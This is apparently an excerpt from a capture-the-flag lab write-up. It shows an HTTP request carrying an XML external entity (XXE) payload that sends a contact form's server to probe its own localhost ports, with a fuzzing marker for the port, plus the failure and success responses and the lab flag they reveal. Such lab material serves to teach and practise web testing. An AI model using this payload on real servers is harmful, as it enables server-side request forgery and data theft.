
Request:
```http
POST /contact_submit.php HTTP/1.1
Host: 10.10.145.74
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
Content-Length: 229
Origin: http://10.10.145.74
Connection: keep-alive
Referer: http://10.10.145.74/contact.php
DNT: 1
Sec-GPC: 1
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
<!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

Failure response:
```http
HTTP/1.1 200 OK
Date: Fri, 06 Dec 2024 19:47:06 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 44
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Thank you, ! Your message has been received.
```

Success response:
```http
HTTP/1.1 200 OK
Date: Fri, 06 Dec 2024 19:51:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 95
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Thank you, Can you exfiltrate the flag?

Flag: THM{0O8_xx3!!}
! Your message has been received.
```
